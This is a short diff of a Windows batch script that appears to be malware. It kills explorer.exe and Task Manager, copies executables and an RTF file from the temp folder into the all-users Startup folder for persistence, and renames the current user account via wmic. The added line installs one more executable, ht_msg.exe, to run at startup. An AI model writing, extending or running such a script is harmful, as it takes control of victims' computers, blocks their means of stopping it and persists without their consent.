@@ -3,6 +3,7 @@ taskkill /f /im explorer.exe
 taskkill /f /im taskmgr.exe
 copy %temp%\one.rtf "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\one.rtf"
 copy %temp%\ht.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ht.exe"
+copy %temp%\ht_msg.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\ht_msg.exe"
 wmic useraccount where name='%username%' set FullName='Hung To'
 wmic useraccount where name='%username%' rename 'Hung To'
 SET /a cr=0
